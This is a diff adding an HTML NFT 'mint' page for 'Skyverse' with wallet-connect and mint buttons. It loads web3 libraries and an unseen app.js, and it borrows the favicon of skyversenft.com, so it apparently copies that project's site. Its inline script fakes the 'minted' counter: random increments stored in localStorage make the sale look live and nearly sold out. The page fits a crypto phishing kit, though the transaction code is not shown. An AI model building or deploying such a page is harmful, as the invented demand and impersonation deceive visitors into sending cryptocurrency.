@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta charset="utf-8">
+    <link rel="icon" href="https://skyversenft.com/favicon.png">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#000000">
+    <meta name="description" content="5,000 Unique Sky Islands coming to the Metaverse">
+    <link rel="apple-touch-icon" href="https://skyversenft.com/favicon.png">
+    <title>Skyverse | Mint</title>
+    <link href="media/main.css" rel="stylesheet">
+  </head>
+
+  <body>
+
+<div id="root">
+  <div>
+    <div class="land-page">
+      <div class="wrap" id="robot">
+<div class="p-5">
+            <div class="">
+               <div class="text-center space-y-4 md:space-y-8">
+                  <div class="h-2"></div>
+                  <h2 class="text-3xl font-bold md:text-5xl leading-solid text-sea-700">SKYVERSE MINT IS LIVE</h2>
+                  <p class="tracking-wider"><span id="nft_left"></span>/5555 minted</p>
+                  <div id="spinner" class="spinner" style="color: white; animation: none;">
+                     <p class="" style="margin-bottom: 10px;">
+                        Total: <span id="totalETH" style="">0.1</span> ETH
+                     </p>
+
+                     <button type="button" class="btn-minus" style="background: white;
+                              position: relative;
+                              color: #445c7f;
+                              font-weight: 700;
+                              text-align: center;
+                              letter-spacing: 2px;
+                              background-position: 0 -15;
+                              padding:7px 20px;
+                              border: 0px solid black;
+                              border-radius: 88px;font-size: 20px;margin-right: 10px;">-</button>
+                     <input type="text" value="1" data-ruler="quantity" id="totalNFT" style="border: 0px solid black;
+                                    text-align: center;
+                                    background: white;color: #445c7f; padding-top:5px; padding-bottom: 5px;
+                                    border-radius: 50px;
+                                    width: 200px;line-height: 1.5;font-size: 20px;">
+                     <button type="button" class="btn-plus" style="background: white;
+                              position: relative;
+                              color: #445c7f;font-weight: 700;
+                              text-align: center;
+                              letter-spacing: 2px;
+                              background-position: 0 -15;
+                              padding:7px 20px;
+                              border: 0px solid black;
+                              border-radius: 88px;font-size: 20px;margin-left:10px;
+                              ">+</button>
+                  </div>
+                  <p class="tracking-wider" id="status">Please Connect to your Wallet before Minting.</p>
+                  <div class="flex items-center justify-center text-base md:text-xl space-x-2">
+                     <a class="bg-white btn text-sea-600" id="connectBtn" style="cursor: pointer;">
+                        Connect Wallet
+                     </a>
+                     <a class="bg-white btn text-sea-600" id="checkoutBtn" style="cursor: pointer; display: block;">
+                        Mint
+                     </a>
+                  </div>
+                  <div class="h-6"></div>
+               </div>
+            </div>
+         </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script type="text/javascript" src="https://unpkg.com/web3@1.6.1/dist/web3.min.js"></script>
+  <script type="text/javascript" src="https://unpkg.com/web3modal@1.9.4/dist/index.js"></script>
+  <script type="text/javascript" src="https://unpkg.com/evm-chains@0.2.0/dist/umd/index.min.js"></script>
+  <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider@1.5.5/dist/umd/index.min.js"></script>
+        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+      <script src="media/app.js"></script>
+      <script>
+        db = window.localStorage;
+
+        if (db.getItem('amount') == null)
+        {
+            var amount = 3485
+            db.setItem("amount", amount)
+        } else {
+            var amount = parseInt(db.getItem('amount'))
+        }
+        smooth_amount = amount
+        var counter = 0
+        // Update the count down every 1 second
+        var x = setInterval(function() {
+          counter++
+          if (counter > 40)
+          {
+            counter = 0
+            if (amount < 5000)
+            {
+                logic = Math.floor((1 - (amount / 4430)) * 100)
+                amount = Math.floor(Math.random() * logic) + amount
+                db.setItem("amount", amount)
+                db.setItem("max", logic)
+            }
+          }
+          if (smooth_amount < amount) {
+            smooth_amount = smooth_amount + ((amount - smooth_amount)/(20 - counter))
+          }
+          // Display the result in the element with id="demo"
+          document.getElementById("nft_left").innerHTML = smooth_amount.toFixed(0);
+          // If the count down is finished, write some text
+        }, 100);
+    </script>
+</body>
+</html>
